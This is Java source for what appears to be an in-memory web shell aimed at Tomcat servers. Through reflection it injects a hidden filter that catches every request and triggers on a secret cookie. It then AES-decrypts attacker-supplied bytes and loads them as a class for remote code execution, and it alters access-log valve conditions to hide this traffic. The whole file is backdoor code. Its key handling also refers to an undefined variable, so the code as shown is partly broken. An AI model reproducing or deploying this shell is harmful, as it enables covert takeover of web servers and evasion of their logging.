package f;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;
/**
 * @FileName: F_AES_BASE64
 * @Date: 2025/7/30/18:02
 * @Author: Eviden
 */
public class F_AES_BASE64 extends ClassLoader implements Filter, Servlet, ServletConfig {
    private static FilterConfig filterConfig;
    public final char[] toBase64 = new char[]{
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z',
            'a',
            'b',
            'c',
            'd',
            'e',
            'f',
            'g',
            'h',
            'i',
            'j',
            'k',
            'l',
            'm',
            'n',
            'o',
            'p',
            'q',
            'r',
            's',
            't',
            'u',
            'v',
            'w',
            'x',
            'y',
            'z',
            '0',
            '1',
            '2',
            '3',
            '4',
            '5',
            '6',
            '7',
            '8',
            '9',
            '+',
            '/'
    };
    private String Pwd;
    private String ck;
    private String secretKey;
    private HashMap parameterMap;
    private ServletConfig servletConfig;
    private ServletContext servletContext;
    private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();

    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add(null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    public F_AES_BASE64() {
    }

    public F_AES_BASE64(ClassLoader loader) {
        super(loader);
    }

    public String get(String key) {
        try {
            return new String((byte[])this.parameterMap.get(key));
        } catch (Exception var3) {
            return null;
        }
    }

    public boolean equals(Object obj) {
        try {
            this.parameterMap = (HashMap)obj;
            this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
            this.Pwd = this.get("pwd");
            this.ck = this.get("ck");
            this.secretKey = this.get("secretKey");
            return true;
        } catch (Exception var3) {
            return false;
        }
    }

    public String toString() {
        this.parameterMap.put("result", this.addFilter(this, this.getStandardContext()).getBytes());
        this.parameterMap = null;
        return "";
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            // c.init(m ? 1 : 2, new SecretKeySpec(this.secretKey.getBytes(), "AES"));
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    public void init(FilterConfig config) throws ServletException {
        filterConfig = config;
    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public void destroy() {
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    public ServletContext getServletContext() {
        return filterConfig.getServletContext();
    }

    public void _jspService(HttpServletRequest request, HttpServletResponse response) throws Exception {
        HttpSession session = null;
        JspWriter out = null;
        JspWriter _jspx_out = null;
        PageContext _jspx_page_context = null;

        try {
            response.setContentType("text/html");
            PageContext pageContext = _jspxFactory.getPageContext(this, request, response, null, true, 8192, true);
            _jspx_page_context = pageContext;
            ServletContext application = pageContext.getServletContext();
            ServletConfig config = pageContext.getServletConfig();
            session = pageContext.getSession();
            out = pageContext.getOut();
            this.noLog(pageContext);

            try {
                String md5 = md5(this.Pwd + this.secretKey);
                byte[] data = this.base64Decode(request.getParameter(this.Pwd));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", new F_AES_BASE64(pageContext.getClass().getClassLoader()).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    Object f = ((Class)session.getAttribute("payload")).newInstance();
                    f.equals(pageContext);
                    response.getWriter().write(md5.substring(0, 16));
                    response.getWriter().write(this.base64Encode(this.x(this.base64Decode(f.toString()), true)));
                    response.getWriter().write(md5.substring(16));
                }
            } catch (Exception var18) {
            }
        } catch (Exception var19) {
        } finally {
            _jspxFactory.releasePageContext(_jspx_page_context);
        }

    }

    public Enumeration<String> getInitParameterNames() {
        return null;
    }

    public String getServletName() {
        return "Servlet";
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest)req;
            HttpServletResponse httpServletResponse = (HttpServletResponse)resp;
            Cookie[] cookies = httpServletRequest.getCookies();
            boolean isNextChain = true;

            for(int i = 0; i < cookies.length; ++i) {
                Cookie cookie = cookies[i];
                if (cookie.getName().equals(this.ck)) {
                    this._jspService(httpServletRequest, httpServletResponse);
                    return;
                }
            }
        } catch (Exception var10) {
        }

        chain.doFilter(req, resp);
    }

    public String getInitParameter(String s) {
        return s;
    }

    protected String addFilter(Filter filter, Object standardContext) {
        try {
            String filterName = filter.getClass().getSimpleName() + System.currentTimeMillis();
            Class standardContextClass = standardContext.getClass();
            ClassLoader standardContextClassLoader = standardContextClass.getClassLoader();
            Object filterMap = this.getMethodParameterTypes(standardContextClass, "addFilterMap")[0].newInstance();
            Object filterDef = this.getMethodParameterTypes(standardContextClass, "addFilterDef")[0].newInstance();
            this.invoke(filterMap, "setURLPattern", "/*");
            this.invoke(filterMap, "addURLPattern", "/*");
            this.invoke(filterMap, "setFilterName", filterName);
            this.invoke(filterDef, "setFilterName", filterName);
            this.invoke(filterDef, "setFilterClass", "org.apache.catalina.filters.SetCharacterEncodingFilter");
            Constructor applicationFilterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", false, standardContextClassLoader)
                    .getDeclaredConstructor(Class.forName("org.apache.catalina.Context", false, standardContextClassLoader), filterDef.getClass());
            applicationFilterConfigConstructor.setAccessible(true);
            Object applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);
            setFieldValue(applicationFilterConfig, "filter", filter);
            this.invoke(filterDef, "setFilterClass", filter.getClass().getName());
            filter.init((FilterConfig)applicationFilterConfig);
            this.invoke(standardContext, "addFilterDef", filterDef);
            this.invoke(standardContext, "addFilterMap", filterMap);
            HashMap filterConfigs = (HashMap)getFieldValue(standardContext, "filterConfigs");
            filterConfigs.put(filterName, applicationFilterConfig);
            Object[] filterMaps = this.invoke(standardContext, "findFilterMaps", null);
            if (filterMaps.length > 1) {
                Object[] tmpFilterMaps = new Object[filterMaps.length];
                int index = 1;

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object _filterMap = filterMaps[i];
                    if (filterName.equals(this.invoke(_filterMap, "getFilterName", null))) {
                        tmpFilterMaps[0] = _filterMap;
                    } else {
                        tmpFilterMaps[index++] = filterMaps[i];
                    }
                }

                for(int i = 0; i < filterMaps.length; ++i) {
                    filterMaps[i] = tmpFilterMaps[i];
                }
            }

            return "ok";
        } catch (Exception var16) {
            return var16.getMessage();
        }
    }

    public ServletConfig getServletConfig() {
        return this;
    }

    public String getServletInfo() {
        return this.getServletName();
    }

    public byte[] base64Decode(String base64Str) {
        if (base64Str.length() == 0) {
            return new byte[0];
        } else {
            byte[] src = base64Str.getBytes();
            int sp = 0;
            int sl = src.length;
            int paddings = 0;
            int len = sl - sp;
            if (src[sl - 1] == 61) {
                ++paddings;
                if (src[sl - 2] == 61) {
                    ++paddings;
                }
            }

            if (paddings == 0 && (len & 3) != 0) {
                paddings = 4 - (len & 3);
            }

            byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
            int[] base64 = new int[256];
            Arrays.fill(base64, -1);
            int i = 0;

            while(i < this.toBase64.length) {
                base64[this.toBase64[i]] = i++;
            }

            base64[61] = -2;
            i = 0;
            int bits = 0;
            int shiftto = 18;

            while(sp < sl) {
                int b = src[sp++] & 255;
                if ((b = base64[b]) < 0 && b == -2) {
                    if (shiftto == 6 && (sp == sl || src[sp++] != 61) || shiftto == 18) {
                        throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
                    }
                    break;
                }

                bits |= b << shiftto;
                shiftto -= 6;
                if (shiftto < 0) {
                    dst[i++] = (byte)(bits >> 16);
                    dst[i++] = (byte)(bits >> 8);
                    dst[i++] = (byte)bits;
                    shiftto = 18;
                    bits = 0;
                }
            }

            if (shiftto == 6) {
                dst[i++] = (byte)(bits >> 16);
            } else if (shiftto == 0) {
                dst[i++] = (byte)(bits >> 16);
                dst[i++] = (byte)(bits >> 8);
            } else if (shiftto == 12) {
                throw new IllegalArgumentException("Last unit does not have enough valid bits");
            }

            if (i != dst.length) {
                byte[] arrayOfByte = new byte[i];
                System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, i));
                dst = arrayOfByte;
            }

            return dst;
        }
    }

    public String base64Encode(String data) {
        return this.base64Encode(data.getBytes());
    }

    public String base64Encode(byte[] src) {
        int off = 0;
        int end = src.length;
        byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        int linemax = -1;
        boolean doPadding = true;
        char[] base64 = this.toBase64;
        int sp = off;
        int slen = (end - off) / 3 * 3;
        int sl = off + slen;
        if (linemax > 0 && slen > linemax / 4 * 3) {
            slen = linemax / 4 * 3;
        }

        int dp;
        int sl0;
        for(dp = 0; sp < sl; sp = sl0) {
            sl0 = Math.min(sp + slen, sl);
            int sp0 = sp;

            int bits;
            for(int dp0 = dp; sp0 < sl0; dst[dp0++] = (byte)base64[bits & 63]) {
                bits = (src[sp0++] & 255) << 16 | (src[sp0++] & 255) << 8 | src[sp0++] & 255;
                dst[dp0++] = (byte)base64[bits >>> 18 & 63];
                dst[dp0++] = (byte)base64[bits >>> 12 & 63];
                dst[dp0++] = (byte)base64[bits >>> 6 & 63];
            }

            sp0 = (sl0 - sp) / 3 * 4;
            dp += sp0;
        }

        if (sp < end) {
            sl0 = src[sp++] & 255;
            dst[dp++] = (byte)base64[sl0 >> 2];
            if (sp == end) {
                dst[dp++] = (byte)base64[sl0 << 4 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                    dst[dp++] = 61;
                }
            } else {
                int b1 = src[sp++] & 255;
                dst[dp++] = (byte)base64[sl0 << 4 & 63 | b1 >> 4];
                dst[dp++] = (byte)base64[b1 << 2 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                }
            }
        }

        return new String(dst);
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    private Class[] getMethodParameterTypes(Class cls, String methodName) {
        Method[] methods = cls.getDeclaredMethods();

        for(int i = 0; i < methods.length; ++i) {
            if (methodName.equals(methods[i].getName())) {
                return methods[i].getParameterTypes();
            }
        }

        return null;
    }

    private void noLog(PageContext pc) {
        try {
            Object applicationContext = getFieldValue(pc.getServletContext(), "context");
            Object container = getFieldValue(applicationContext, "context");

            ArrayList arrayList;
            for(arrayList = new ArrayList(); container != null; container = this.invoke(container, "getParent", null)) {
                arrayList.add(container);
            }

            for(int i = 0; i < arrayList.size(); ++i) {
                try {
                    Object pipeline = this.invoke(arrayList.get(i), "getPipeline", null);
                    if (pipeline != null) {
                        Object valve = this.invoke(pipeline, "getFirst", null);

                        while(valve != null) {
                            if (this.getMethodByClass(valve.getClass(), "getCondition", null) != null
                                    && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                                String condition = (String)this.invoke(valve, "getCondition");
                                condition = condition == null ? "FuckLog" : condition;
                                this.invoke(valve, "setCondition", condition);
                                pc.getRequest().setAttribute(condition, condition);
                                valve = this.invoke(valve, "getNext", null);
                            } else if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader())
                                    .isAssignableFrom(valve.getClass())) {
                                valve = this.invoke(valve, "getNext", null);
                            } else {
                                valve = null;
                            }
                        }
                    }
                } catch (Exception var9) {
                }
            }
        } catch (Exception var10) {
        }

    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }

        f.setAccessible(true);
        f.set(obj, value);
    }

    private Object getStandardContext() {
        try {
            return getFieldValue(getFieldValue(this.servletContext, "context"), "context");
        } catch (Exception var2) {
            return null;
        }
    }

    public Class Q(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }
}
